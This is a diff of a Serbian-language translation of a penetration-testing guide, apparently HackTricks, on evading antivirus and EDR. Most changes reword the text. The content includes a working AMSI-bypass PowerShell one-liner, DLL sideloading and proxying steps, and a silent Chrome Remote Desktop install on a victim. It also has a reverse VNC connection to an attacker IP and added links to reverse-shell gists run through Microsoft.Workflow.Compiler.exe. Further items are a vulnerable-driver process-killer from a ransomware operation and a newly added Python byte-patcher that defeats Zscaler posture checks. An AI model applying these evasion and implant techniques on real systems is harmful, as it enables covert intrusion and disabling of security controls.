@@ -37,9 +37,9 @@ Toplo preporučujem da pogledaš ovu [YouTube plejlistu](https://www.youtube.com
 
 ### **Dinamička analiza**
 
-Dinamička analiza je kada AV pokreće tvoj binarni fajl u sandbox-u i prati malicioznu aktivnost (npr. pokušaj dekripcije i čitanja lozinki iz tvog pretraživača, izvođenje minidump-a na LSASS, itd.). Ovaj deo može biti malo teži za rad, ali evo nekoliko stvari koje možeš uraditi da izbegneš sandbox-e.
+Dinamička analiza je kada AV pokreće tvoj binarni fajl u sandbox-u i prati malicioznu aktivnost (npr. pokušaj dekripcije i čitanja lozinki iz tvog pretraživača, izvođenje minidump-a na LSASS-u, itd.). Ovaj deo može biti malo teži za rad, ali evo nekoliko stvari koje možeš uraditi da izbegneš sandbox-e.
 
-- **Spavanje pre izvršenja** U zavisnosti od toga kako je implementirano, može biti odličan način za zaobilaženje dinamičke analize AV-a. AV-ima je potrebno vrlo malo vremena da skeniraju datoteke kako ne bi ometali rad korisnika, tako da korišćenje dugih perioda spavanja može ometati analizu binarnih fajlova. Problem je što mnogi AV-ovi sandbox-i mogu jednostavno preskočiti spavanje u zavisnosti od toga kako je implementirano.
+- **Spavanje pre izvršenja** U zavisnosti od toga kako je implementirano, može biti odličan način za zaobilaženje dinamičke analize AV-a. AV-ima je potrebno vrlo malo vremena da skeniraju datoteke kako ne bi prekinuli radni tok korisnika, tako da korišćenje dugih spavanja može ometati analizu binarnih fajlova. Problem je što mnogi AV-ovi sandbox-i mogu jednostavno preskočiti spavanje u zavisnosti od toga kako je implementirano.
 - **Proveravanje resursa mašine** Obično sandbox-i imaju vrlo malo resursa za rad (npr. < 2GB RAM), inače bi mogli usporiti korisničku mašinu. Takođe možeš biti veoma kreativan ovde, na primer, proveravajući temperaturu CPU-a ili čak brzine ventilatora, ne mora sve biti implementirano u sandbox-u.
 - **Provere specifične za mašinu** Ako želiš da ciljaš korisnika čija je radna stanica pridružena "contoso.local" domenu, možeš izvršiti proveru na domen mašine da vidiš da li se poklapa sa onim što si naveo, ako se ne poklapa, možeš naterati svoj program da izađe.
 
@@ -53,9 +53,9 @@ Neki drugi zaista dobri saveti od [@mgeeky](https://twitter.com/mariuszbit) za b
 
 Kao što smo rekli ranije u ovom postu, **javni alati** će na kraju **biti otkriveni**, tako da bi trebao da se zapitaš nešto:
 
-Na primer, ako želiš da dump-uješ LSASS, **da li zaista treba da koristiš mimikatz**? Ili bi mogao da koristiš neki drugi projekat koji je manje poznat i takođe dump-uje LSASS.
+Na primer, ako želiš da dump-uješ LSASS, **da li ti zaista treba da koristiš mimikatz**? Ili bi mogao da koristiš neki drugi projekat koji je manje poznat i takođe dump-uje LSASS.
 
-Pravi odgovor je verovatno potonji. Uzimajući mimikatz kao primer, verovatno je jedan od, ako ne i najviše označenih malver-a od strane AV-a i EDR-a, dok je projekat sam po sebi super cool, takođe je noćna mora raditi s njim da bi se zaobišli AV-ovi, tako da samo potraži alternative za ono što pokušavaš da postigneš.
+Pravi odgovor je verovatno potonji. Uzimajući mimikatz kao primer, verovatno je jedan od, ako ne i najviše označenih malvera od strane AV-a i EDR-a, dok je projekat sam po sebi super cool, takođe je noćna mora raditi s njim da bi se zaobišli AV-ovi, tako da samo potraži alternative za ono što pokušavaš da postigneš.
 
 > [!TIP]
 > Kada modifikuješ svoje payload-e za evaziju, obavezno **isključi automatsko slanje uzoraka** u Defender-u, i molim te, ozbiljno, **NE ULAŽI NA VIRUSTOTAL** ako ti je cilj postizanje evazije na duže staze. Ako želiš da proveriš da li tvoj payload biva otkriven od strane određenog AV-a, instaliraj ga na VM, pokušaj da isključiš automatsko slanje uzoraka, i testiraj ga tamo dok ne budeš zadovoljan rezultatom.
@@ -68,11 +68,11 @@ Kao što možemo videti na ovoj slici, DLL payload iz Havoc-a ima stopu detekcij
 
 <figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me poređenje normalnog Havoc EXE payload-a vs normalnog Havoc DLL-a</p></figcaption></figure>
 
-Sada ćemo pokazati neke trikove koje možeš koristiti sa DLL fajlovima da bi bio mnogo neprimetniji.
+Sada ćemo pokazati neke trikove koje možeš koristiti sa DLL fajlovima da bi bio mnogo stealthier.
 
 ## DLL Sideloading & Proxying
 
-**DLL Sideloading** koristi prednost reda pretrage DLL-a koji koristi loader tako što postavlja i aplikaciju žrtve i maliciozni payload zajedno.
+**DLL Sideloading** koristi prednost reda pretrage DLL-a koji koristi loader tako što pozicionira i aplikaciju žrtve i maliciozni payload zajedno.
 
 Možeš proveriti programe podložne DLL Sideloading-u koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell skript:
 ```bash
@@ -83,7 +83,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 ```
 Ova komanda će prikazati listu programa podložnih DLL hijackingu unutar "C:\Program Files\\" i DLL datoteka koje pokušavaju da učitaju.
 
-Toplo preporučujem da **istražite DLL hijackable/sideloadable programe sami**, ova tehnika je prilično suptilna kada se pravilno izvede, ali ako koristite javno poznate DLL sideloadable programe, lako možete biti uhvaćeni.
+Toplo preporučujem da **istražite DLL hijackable/sideloadable programe sami**, ova tehnika je prilično neprimetna kada se pravilno izvede, ali ako koristite javno poznate DLL sideloadable programe, lako možete biti uhvaćeni.
 
 Samo postavljanje malicioznog DLL-a sa imenom koje program očekuje da učita, neće učitati vaš payload, jer program očekuje neke specifične funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku nazvanu **DLL Proxying/Forwarding**.
 
@@ -106,7 +106,7 @@ Poslednja komanda će nam dati 2 fajla: šablon izvorne koda DLL-a i originalni 
 ```
 <figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-Oba naša shellcode (kodiran sa [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.
+I naš shellcode (kodiran sa [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.
 
 <figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>
 
@@ -167,11 +167,11 @@ Pošto je AMSI implementiran učitavanjem DLL-a u proces powershell-a (takođe c
 
 **Prisiljavanje na grešku**
 
-Prisiljavanje AMSI inicijalizacije da ne uspe (amsiInitFailed) će rezultirati time da nijedno skeniranje neće biti inicirano za trenutni proces. Prvobitno je ovo otkrio [Matt Graeber](https://twitter.com/mattifestation) i Microsoft je razvio potpis da spreči širu upotrebu.
+Prisiljavanje AMSI inicijalizacije da ne uspe (amsiInitFailed) rezultira time da se nijedno skeniranje neće pokrenuti za trenutni proces. Prvobitno je ovo otkrio [Matt Graeber](https://twitter.com/mattifestation) i Microsoft je razvio potpis da spreči širu upotrebu.
 ```bash
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
-Sve što je bilo potrebno je jedna linija powershell koda da se AMSI učini neupotrebljivim za trenutni powershell proces. Ova linija je naravno označena od strane AMSI-a, tako da su potrebne neke izmene kako bi se ova tehnika koristila.
+Sve što je bilo potrebno je jedna linija powershell koda da se AMSI učini neupotrebljivim za trenutni powershell proces. Ova linija je naravno označena od strane AMSI-a, tako da su potrebne neke modifikacije da bi se koristila ova tehnika.
 
 Evo modifikovanog AMSI bypass-a koji sam uzeo iz ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
 ```bash
@@ -191,12 +191,12 @@ Imajte na umu da će ovo verovatno biti označeno kada ovaj post bude objavljen,
 
 **Memory Patching**
 
-Ova tehnika je prvobitno otkrivena od strane [@RastaMouse](https://twitter.com/_RastaMouse/) i uključuje pronalaženje adrese za funkciju "AmsiScanBuffer" u amsi.dll (odgovornu za skeniranje korisničkog unosa) i prepisivanje sa instrukcijama da vrati kod za E_INVALIDARG, na ovaj način, rezultat stvarnog skeniranja će vratiti 0, što se tumači kao čist rezultat.
+Ova tehnika je prvobitno otkrivena od strane [@RastaMouse](https://twitter.com/_RastaMouse/) i uključuje pronalaženje adrese za funkciju "AmsiScanBuffer" u amsi.dll (odgovornu za skeniranje korisnički unetih podataka) i prepisivanje sa instrukcijama da vrati kod za E_INVALIDARG, na ovaj način, rezultat stvarnog skeniranja će vratiti 0, što se tumači kao čist rezultat.
 
 > [!TIP]
 > Molimo vas da pročitate [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.
 
-Takođe postoji mnogo drugih tehnika koje se koriste za zaobilaženje AMSI sa PowerShell-om, pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.
+Postoji mnogo drugih tehnika koje se koriste za zaobilaženje AMSI sa PowerShell-om, pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.
 
 Ovaj alat [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) takođe generiše skriptu za zaobilaženje AMSI.
 
@@ -258,7 +258,7 @@ SmartScreen uglavnom funkcioniše na osnovu reputacije, što znači da će neobi
 > [!TIP]
 > Važno je napomenuti da izvršne datoteke potpisane **pouzdanom** potpisnom sertifikatom **neće aktivirati SmartScreen**.
 
-Veoma efikasan način da sprečite da vaši payload-ovi dobiju Mark of The Web je pakovanje unutar nekog oblika kontejnera kao što je ISO. To se dešava jer Mark-of-the-Web (MOTW) **ne može** biti primenjen na **non NTFS** volumene.
+Veoma efikasan način da sprečite da vaši payload-ovi dobiju Mark of The Web je pakovanje unutar nekog oblika kontejnera poput ISO-a. To se dešava jer Mark-of-the-Web (MOTW) **ne može** biti primenjen na **non NTFS** volumene.
 
 <figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>
 
@@ -309,7 +309,7 @@ Većina C2 okvira (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već
 
 - **Fork\&Run**
 
-Ovo uključuje **pokretanje novog žrtvenog procesa**, injektovanje vašeg zlonamernog koda u taj novi proces, izvršavanje vašeg zlonamernog koda i kada završite, ubijanje novog procesa. Ovo ima svoje prednosti i nedostatke. Prednost metode fork and run je u tome što se izvršavanje dešava **izvan** našeg Beacon implant procesa. To znači da ako nešto u našoj akciji nakon eksploatacije pođe po zlu ili bude uhvaćeno, postoji **mnogo veća šansa** da naš **implant preživi.** Nedostatak je u tome što imate **veću šansu** da budete uhvaćeni od strane **Behavioral Detections**.
+Ovo uključuje **pokretanje novog žrtvenog procesa**, injektovanje vašeg zlonamernog koda u taj novi proces, izvršavanje vašeg zlonamernog koda i kada završite, ubijanje novog procesa. Ovo ima svoje prednosti i nedostatke. Prednost metode fork and run je u tome što se izvršavanje dešava **van** našeg Beacon implant procesa. To znači da ako nešto u našoj akciji nakon eksploatacije pođe po zlu ili bude uhvaćeno, postoji **mnogo veća šansa** da naš **implant preživi.** Nedostatak je u tome što imate **veću šansu** da budete uhvaćeni od strane **Behavioral Detections**.
 
 <figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>
 
@@ -350,7 +350,7 @@ Kao što je opisano u [**ovom blog postu**](https://trustedsec.com/blog/abusing-
 1. Preuzmite sa https://remotedesktop.google.com/, kliknite na "Set up via SSH", a zatim kliknite na MSI datoteku za Windows da preuzmete MSI datoteku.
 2. Pokrenite instalater tiho na žrtvi (potrebna je administrativna dozvola): `msiexec /i chromeremotedesktophost.msi /qn`
 3. Vratite se na stranicu Chrome Remote Desktop i kliknite na sledeće. Čarobnjak će vas zatim pitati da autorizujete; kliknite na dugme Autorize da nastavite.
-4. Izvršite dati parametar sa nekim prilagođavanjima: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Napomena: parametar pin omogućava postavljanje pina bez korišćenja GUI).
+4. Izvršite dati parametar sa nekim prilagođavanjima: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Obratite pažnju na pin parametar koji omogućava postavljanje pina bez korišćenja GUI).
 
 ## Advanced Evasion
 
@@ -364,7 +364,7 @@ Toplo vas savetujem da pogledate ovaj govor od [@ATTL4S](https://twitter.com/Dan
 https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
 {{#endref}}
 
-Ovo je takođe još jedan odličan govor od [@mariuszbit](https://twitter.com/mariuszbit) o Evasiji u dubini.
+Ovo je takođe još jedan sjajan govor od [@mariuszbit](https://twitter.com/mariuszbit) o Evasiji u Dubini.
 
 {{#ref}}
 https://www.youtube.com/watch?v=IbA7Ung39o4
@@ -406,9 +406,9 @@ Zatim, premestite binarni _**winvnc.exe**_ i **novokreirani** fajl _**UltraVNC.i
 
 #### **Obrnuta veza**
 
-**Napadač** treba da **izvrši unutar** svog **hosta** binarni `vncviewer.exe -listen 5900` kako bi bio **pripremljen** da uhvati obrnutu **VNC vezu**. Zatim, unutar **žrtve**: Pokrenite winvnc daemon `winvnc.exe -run` i izvršite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+**Napadač** treba da **izvrši unutar** svog **hosta** binarni `vncviewer.exe -listen 5900` kako bi bio **pripremljen** da uhvati obrnutu **VNC vezu**. Zatim, unutar **žrtve**: Pokrenite winvnc daemon `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
 
-**UPWARNING:** Da biste održali tajnost, ne smete raditi nekoliko stvari
+**UPWARNING:** Da biste održali neprimetnost, ne smete raditi nekoliko stvari
 
 - Ne pokrećite `winvnc` ako već radi ili ćete aktivirati [popup](https://i.imgur.com/1SROTTl.png). proverite da li radi sa `tasklist | findstr winvnc`
 - Ne pokrećite `winvnc` bez `UltraVNC.ini` u istom direktorijumu ili će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
@@ -531,6 +531,10 @@ catch (Exception err) { }
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
+[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)
+
+[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)
+
 Automatsko preuzimanje i izvršavanje:
 ```csharp
 64bit:
@@ -596,7 +600,7 @@ https://github.com/praetorian-code/vulcan
 Storm-2603 je iskoristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući zaštitu na krajnjim tačkama pre nego što ispusti ransomware. Alat donosi **svoj ranjivi ali *potpisani* drajver** i zloupotrebljava ga da izvrši privilegovane kernel operacije koje čak ni Protected-Process-Light (PPL) AV servisi ne mogu da blokiraju.
 
 Ključne tačke
-1. **Potpisani drajver**: Datoteka isporučena na disk je `ServiceMouse.sys`, ali je binarni fajl legitimno potpisani drajver `AToolsKrnl64.sys` iz “System In-Depth Analysis Toolkit” Antiy Labs. Pošto drajver nosi važeći Microsoft potpis, učitava se čak i kada je omogućena zaštita od potpisivanja drajvera (DSE).
+1. **Potpisani drajver**: Datoteka isporučena na disk je `ServiceMouse.sys`, ali je binarni fajl legitimno potpisani drajver `AToolsKrnl64.sys` iz “System In-Depth Analysis Toolkit” Antiy Labs. Pošto drajver nosi važeći Microsoft potpis, učitava se čak i kada je omogućena provera potpisa drajvera (DSE).
 2. **Instalacija servisa**:
 ```powershell
 sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
@@ -622,14 +626,54 @@ CloseHandle(hDrv);
 return 0;
 }
 ```
-4. **Zašto to funkcioniše**: BYOVD potpuno preskoči zaštitu u korisničkom režimu; kod koji se izvršava u kernelu može otvoriti *zaštićene* procese, prekinuti ih ili manipulisati kernel objektima bez obzira na PPL/PP, ELAM ili druge funkcije očvršćavanja.
+4. **Zašto to funkcioniše**: BYOVD potpuno preskoči zaštite u korisničkom režimu; kod koji se izvršava u kernelu može otvoriti *zaštićene* procese, prekinuti ih ili manipulisati kernel objektima bez obzira na PPL/PP, ELAM ili druge funkcije učvršćivanja.
 
-Detekcija / Ublažavanje
-•  Omogućite Microsoftovu listu blokiranja ranjivih drajvera (`HVCI`, `Smart App Control`) tako da Windows odbije da učita `AToolsKrnl64.sys`.
-•  Pratite kreiranje novih *kernel* servisa i obaveštavajte kada se drajver učita iz direktorijuma koji može da se piše ili nije prisutan na listi dozvoljenih.
-•  Pratite korisničke handle za prilagođene objekte uređaja praćene sumnjivim pozivima `DeviceIoControl`.
+Otkrivanje / Ublažavanje
+•  Omogućite Microsoftovu listu blokiranih ranjivih drajvera (`HVCI`, `Smart App Control`) tako da Windows odbije da učita `AToolsKrnl64.sys`.
+•  Pratite kreiranje novih *kernel* servisa i obaveštavajte kada se drajver učita iz direktorijuma koji može da piše bilo ko ili nije prisutan na listi dozvoljenih.
+•  Pratite rukovanje u korisničkom režimu sa prilagođenim objektima uređaja praćeno sumnjivim pozivima `DeviceIoControl`.
+
+### Zaobilaženje Zscaler Client Connector provere stanja putem patch-ovanja binarnih fajlova na disku
+
+Zscalerov **Client Connector** primenjuje pravila stanja uređaja lokalno i oslanja se na Windows RPC da komunicira rezultate drugim komponentama. Dva slaba dizajnerska izbora omogućavaju potpuno zaobilaženje:
+
+1. Evaluacija stanja se dešava **potpuno na klijentskoj strani** (boolean se šalje serveru).
+2. Interni RPC krajnji tačke samo validiraju da je izvršna datoteka koja se povezuje **potpisana od strane Zscalera** (putem `WinVerifyTrust`).
+
+Patch-ovanjem **četiri potpisana binarna fajla na disku** oba mehanizma mogu biti neutralisana:
+
+| Binarni | Originalna logika patch-ovana | Rezultat |
+|--------|------------------------|---------|
+| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1` tako da je svaka provera usklađena |
+| `ZSAService.exe` | Indirektni poziv `WinVerifyTrust` | NOP-ed ⇒ bilo koji (čak i nepotpisani) proces može da se poveže na RPC cevi |
+| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
+| `ZSATunnel.exe` | Provere integriteta na tunelu | Prekinuto |
+
+Minimalni izvod patch-era:
+```python
+pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
+replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1
+
+with open("ZSATrayManager.exe", "r+b") as f:
+data = f.read()
+off = data.find(pattern)
+if off == -1:
+print("pattern not found")
+else:
+f.seek(off)
+f.write(replacement)
+```
+Nakon zamene originalnih fajlova i ponovnog pokretanja servisnog staka:
+
+* **Sve** provere stanja prikazuju **zelenu/usaglašenu**.
+* Nepotpisani ili modifikovani binarni fajlovi mogu otvoriti nazvane RPC krajnje tačke (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
+* Kompromitovani host dobija neograničen pristup unutrašnjoj mreži definisanoj Zscaler politikama.
+
+Ova studija slučaja pokazuje kako se čiste odluke o poverenju na klijentskoj strani i jednostavne provere potpisa mogu prevazići sa nekoliko bajt patch-ova.
 
 ## Reference
 
-- [Check Point Research – Pre ToolShell: Istraživanje prethodnih ransomware operacija Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
+- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
+
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 {{#include ../banners/hacktricks-training.md}}
